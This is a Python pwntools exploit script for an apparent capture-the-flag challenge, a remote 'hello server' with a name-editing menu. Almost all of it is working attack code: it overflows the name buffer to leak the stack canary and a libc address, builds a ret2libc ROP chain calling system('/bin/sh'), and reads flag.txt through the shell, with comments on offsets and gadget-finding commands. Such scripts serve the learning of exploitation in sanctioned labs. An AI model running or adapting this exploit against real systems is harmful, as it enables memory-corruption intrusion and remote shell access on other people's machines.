#!/usr/bin/env python3
from pwn import *
import time

# context.log_level = 'debug'

# p = process('./hello')
p = remote('140.113.24.241', 30174)

p.recvuntil(b'Welcome to the hello server, try to get the flag!\n\n1. Edit Name\n2. Say Hello\n3. Exit\nInput your choice:\n')
p.send(b'1')

# leak canary
p.recvuntil(b'Enter your new name\n> ')
p.send(b'A' * 41)
p.recvuntil(b'Set fans name to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')

sleep(0.5)
ret = p.recv()
canary = ret[0:7].rjust(8, b'\x00')
print("canary : " + str(hex(u64(canary))))
p.send(b'N')

# leak libc_base
p.recvuntil(b'Enter your new name\n> ')
p.send(b'A' * 88)
p.recvuntil(b'Set fans name to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')

sleep(0.5)
ret  = p.recv()
temp = ret[0:6].ljust(8, b'\x00')

# my local host
# libc_base = int(hex(int(hex(u64(temp)), 16) - int(hex(122), 16) - int("0x271d0", 16)), 16)
# libc_bin_sh = libc_base + 0x196031     # /bin/sh
# libc_system = libc_base + 0x04c490     # system()
# pop_rdi_ret = libc_base + 0x0277e5     # pop rdi ; ret ;
# ret_addr    = libc_base + 0x027182     # ret ;

# server
libc_base = int((hex(int(hex(u64(temp)), 16) - int(hex(122), 16) - int("0x271d0", 16) - int("0x2b46", 16))), 16)
libc_bin_sh = libc_base + 0x1d8678     # /bin/sh
libc_system = libc_base + 0x050d70     # system()
pop_rdi_ret = libc_base + 0x02a3e5     # pop rdi ; ret
ret_addr    = libc_base + 0x029139     # ret ;

# print("libc base: " + str(hex(libc_base)))

# pause()

p.send(b'N')
p.recvuntil(b'Enter your new name\n> ')

# ret2libc
payload = b'A' * 32 + temp + canary + b'C' * 8 + p64(ret_addr) + p64(pop_rdi_ret) + p64(libc_bin_sh) + p64(libc_system)
p.send(payload)
p.recvuntil(b'(Y/N)')

p.send(b'Y')

# p.interactive()

for i in range(5):
    sleep(2)
    p.sendline(b'cat flag.txt')
    print(p.recv())

# demo prob:
# what is different between read and scanf?
# read: read bytes and store in buffer
# scanf: read bytes and store in buffer, but it will append '\x00' at the end of buffer

# Note:
# input buffer size = 32
# input + 40 = canary
# payload = b'A' * 32 + temp != b'A' * 40
# 是因為 temp 的 8 byte 會被填入 RBP, system() 會檢查 RBP, 所以不能填入 8 byte 的 b'A' （會 BUS ERROR）

# -------------------------------------
# 0x7ffe449919e0(+0)  -> input[0x20]
# 0x7ffe44991a08(+40) -> canary
# 0x7ffe44991a38(+88) -> 0x00007fc8d684624a (__libc_start_call_main+122) 

# 0x7fc8d68461d0 -> __libc_start_call_main
# 0x7fc8d681f000 -> libc_base_address

# -------------------------------------
# useful commands:
# ldd hello
# ROPgadget --binary ./hello --only "pop|ret"
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
